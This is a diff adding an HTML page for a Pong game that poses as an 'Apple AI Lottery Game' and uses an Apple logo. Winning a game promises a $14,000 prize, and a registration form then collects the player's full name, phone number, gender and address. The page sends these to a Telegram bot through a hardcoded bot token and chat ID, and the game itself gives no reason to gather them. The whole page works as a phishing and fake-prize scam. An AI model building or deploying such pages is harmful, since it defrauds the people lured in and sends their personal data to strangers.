@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Crazy Pong</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: radial-gradient(circle, #0a0a0a 0%, #000000 100%);
+      font-family: 'Orbitron', sans-serif;
+      color: #0f0;
+      text-align: center;
+      overflow: hidden;
+    }
+    h2, h3, p {
+      text-shadow: 0 0 10px #0f0;
+    }
+    .form-container, .popup, .register-form {
+      max-width: 400px;
+      margin: 30px auto;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 12px;
+      box-shadow: 0 0 15px #0ff;
+    }
+    input, select {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: none;
+      font-size: 1em;
+    }
+    button {
+      background: #0ff;
+      color: #000;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 1em;
+      cursor: pointer;
+      box-shadow: 0 0 10px #0ff, 0 0 20px #0ff;
+    }
+    canvas {
+      background: linear-gradient(180deg, #0a0a0a 0%, #000000 100%);
+      border: 2px solid #0ff;
+      border-radius: 10px;
+      display: block;
+      margin: 10px auto;
+    }
+    #loadingText {
+      font-size: 2em;
+      color: #0f0;
+      font-weight: bold;
+      text-shadow: 0 0 10px #0f0;
+    }
+    #scoreboard {
+      display: flex;
+      justify-content: space-between;
+      font-size: 1.2em;
+      padding: 8px 20px;
+      color: #fff;
+      text-shadow: 0 0 6px #0ff;
+    }
+    .winner {
+      font-size: 1.6em;
+      color: #ff0;
+      text-shadow: 0 0 10px #ff0;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+ <header>
+    <div style="background-color: #0000ft; padding: 20px; max-width: 400px; border-radius: 8px; box-shadow: 0 0 10px pink; color: black; text-align: center; font-size: 18px; font-weight: bold;">
+        <img width="35" height="35" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/><font color="gray">Apple AI Lottery Game</font></header>
+<body>
+
+  <!-- Nickname Form -->
+  <div class="form-container" id="nicknameForm">
+    <h2>Enter Nickname</h2>
+    <input type="text" id="nickname" placeholder="Your Nickname" />
+    <button onclick="startLoading()">Continue</button>
+  </div>
+
+  <!-- Loading Screen -->
+  <div class="form-container hidden" id="loadingScreen">
+    <p id="loadingText">Loading... 1%</p>
+  </div>
+
+  <!-- Start Game -->
+  <div class="form-container hidden" id="startGameScreen">
+    <h2>Welcome <span id="nickDisplay"></span></h2>
+    <p>Your opponent: <span id="aiNameDisplay"></span></p>
+    <button onclick="launchGame()">Start Game</button>
+  </div>
+
+  <!-- Game Area -->
+  <div class="form-container hidden" id="gameContainer">
+    <div id="scoreboard">
+      <div id="playerScore">You: 0</div>
+      <div id="aiScore">AI: 0</div>
+    </div>
+    <canvas id="gameCanvas" width="300" height="500"></canvas>
+  </div>
+
+  <!-- Game Over -->
+  <div class="popup hidden" id="winnerPopup">
+    <p class="winner" id="winnerText"></p>
+    <p id="prizeMsg"></p>
+    <button onclick="handleWinner()">Continue</button>
+    <button class="hidden" id="retryBtn" onclick="location.reload()">Try Again</button>
+  </div>
+
+  <!-- Registration -->
+  <div class="register-form hidden" id="registerForm">
+    <h3 id="registerNote"></h3>
+    <input type="text" id="fullName" placeholder="Full Name" />
+    <input type="text" id="phone" placeholder="Phone Number" />
+    <select id="gender">
+      <option value="">Gender</option>
+      <option>Male</option>
+      <option>Female</option>
+    </select>
+    <input type="text" id="address" placeholder="Address" />
+    <button onclick="submitToTelegram()">Submit</button>
+  </div>
+
+  <script>
+    let nickname = "", playerScore = 0, aiScore = 0, gameStarted = false;
+    const maxScore = 3;
+    const aiNames = ["Liam", "Zara", "Leo", "Nova", "Kai"];
+    let aiName = aiNames[Math.floor(Math.random() * aiNames.length)];
+    let userRegistered = false;
+
+    function startLoading() {
+      nickname = document.getElementById("nickname").value.trim();
+      if (!nickname) return alert("Please enter your nickname!");
+      document.getElementById("nicknameForm").classList.add("hidden");
+      document.getElementById("loadingScreen").classList.remove("hidden");
+      let i = 1;
+      let interval = setInterval(() => {
+        document.getElementById("loadingText").innerText = `Loading... ${i}%`;
+        i++;
+        if (i > 100) {
+          clearInterval(interval);
+          document.getElementById("loadingScreen").classList.add("hidden");
+          document.getElementById("startGameScreen").classList.remove("hidden");
+          document.getElementById("nickDisplay").innerText = nickname;
+          document.getElementById("aiNameDisplay").innerText = aiName;
+        }
+      }, 20);
+    }
+
+    function launchGame() {
+      document.getElementById("startGameScreen").classList.add("hidden");
+      document.getElementById("gameContainer").classList.remove("hidden");
+      initGame();
+    }
+
+    function initGame() {
+      const canvas = document.getElementById("gameCanvas");
+      const ctx = canvas.getContext("2d");
+      const paddleW = 60, paddleH = 10;
+      let playerX = canvas.width / 2 - paddleW / 2;
+      let aiX = playerX;
+      let ballX = canvas.width / 2, ballY = canvas.height / 2;
+      let ballSpeedX = 3, ballSpeedY = 4;
+      const radius = 6;
+
+      canvas.addEventListener("touchmove", e => {
+        const rect = canvas.getBoundingClientRect();
+        playerX = e.touches[0].clientX - rect.left - paddleW / 2;
+      });
+
+      canvas.addEventListener("mousemove", e => {
+        const rect = canvas.getBoundingClientRect();
+        playerX = e.clientX - rect.left - paddleW / 2;
+      });
+
+      function update() {
+        if (!gameStarted) return;
+        ballX += ballSpeedX;
+        ballY += ballSpeedY;
+        if (ballX <= 0 || ballX >= canvas.width) ballSpeedX *= -1;
+
+        if (ballY + radius >= canvas.height - paddleH &&
+            ballX > playerX && ballX < playerX + paddleW) {
+          ballSpeedY *= -1;
+          ballY = canvas.height - paddleH - radius;
+        }
+
+        if (ballY - radius <= paddleH &&
+            ballX > aiX && ballX < aiX + paddleW) {
+          ballSpeedY *= -1;
+          ballY = paddleH + radius;
+        }
+
+        if (ballY > canvas.height) {
+          aiScore++;
+          updateScores();
+          if (aiScore >= maxScore) endGame(aiName, aiScore, false);
+          resetBall();
+        }
+
+        if (ballY < 0) {
+          playerScore++;
+          updateScores();
+          if (playerScore >= maxScore) endGame(nickname, playerScore, true);
+          resetBall();
+        }
+
+        aiX += (ballX - aiX - paddleW / 2) * 0.03;
+      }
+
+      function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0ff";
+        ctx.shadowBlur = 10;
+        ctx.shadowColor = "#0ff";
+        ctx.beginPath();
+        ctx.arc(ballX, ballY, radius, 0, Math.PI * 2);
+        ctx.fill();
+
+        ctx.fillStyle = "#0f0";
+        ctx.shadowColor = "#0f0";
+        ctx.fillRect(playerX, canvas.height - paddleH, paddleW, paddleH);
+
+        ctx.fillStyle = "red";
+        ctx.shadowColor = "red";
+        ctx.fillRect(aiX, 0, paddleW, paddleH);
+      }
+
+      function resetBall() {
+        ballX = canvas.width / 2;
+        ballY = canvas.height / 2;
+        ballSpeedY *= -1;
+      }
+
+      function loop() {
+        update();
+        draw();
+        requestAnimationFrame(loop);
+      }
+
+      gameStarted = true;
+      loop();
+    }
+
+    function updateScores() {
+      document.getElementById("playerScore").innerText = `You: ${playerScore}`;
+      document.getElementById("aiScore").innerText = `${aiName}: ${aiScore}`;
+      document.getElementById("playerScore").style.color = playerScore >= aiScore ? "#0f0" : "red";
+      document.getElementById("aiScore").style.color = aiScore > playerScore ? "#0f0" : "red";
+    }
+
+    function endGame(winner, score, userWon) {
+      gameStarted = false;
+      document.getElementById("gameContainer").classList.add("hidden");
+      document.getElementById("winnerPopup").classList.remove("hidden");
+      document.getElementById("winnerText").innerText = userWon
+        ? `${winner} wins with score ${score}`
+        : `You lost! ${winner} wins with score ${score}`;
+      document.getElementById("prizeMsg").innerText = userWon ? "Congrats! You won $14,000" : "";
+      document.querySelector("#winnerPopup button").classList.toggle("hidden", !userWon);
+      document.getElementById("retryBtn").classList.toggle("hidden", userWon);
+    }
+
+    function handleWinner() {
+      if (userRegistered) {
+        window.location.href = "games.html";
+      } else {
+        document.getElementById("winnerPopup").classList.add("hidden");
+        document.getElementById("registerForm").classList.remove("hidden");
+        document.getElementById("registerNote").innerHTML = `Dear <b>${nickname}</b>, register here.`;
+      }
+    }
+
+    function submitToTelegram() {
+      const name = document.getElementById("fullName").value;
+      const phone = document.getElementById("phone").value;
+      const gender = document.getElementById("gender").value;
+      const address = document.getElementById("address").value;
+      if (!name || !phone || !gender || !address) return alert("Fill all fields!");
+
+      const msg = `Winner:\nNick: ${nickname}\nName: ${name}\nPhone: ${phone}\nGender: ${gender}\nAddress: ${address}`;
+      const botToken = "7612075949:AAFYpoGkaGHsFsM00zt1QQkKowiBxDORmr0";
+      const chatId = "7486773651";
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+        .then(() => {
+          alert("Submitted!");
+          userRegistered = true;
+          window.location.href = "certificate.html";
+        })
+        .catch(() => alert("Submission failed."));
+    }
+  </script>
+</body>
+<!-- Footer -->
+    <footer>
+         <img width="20" height="20" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/>  &copy; 2025 IA Lottery.| All Rights Reserved | Play Smart, Win Big! </p>
+    </footer>
+</html>
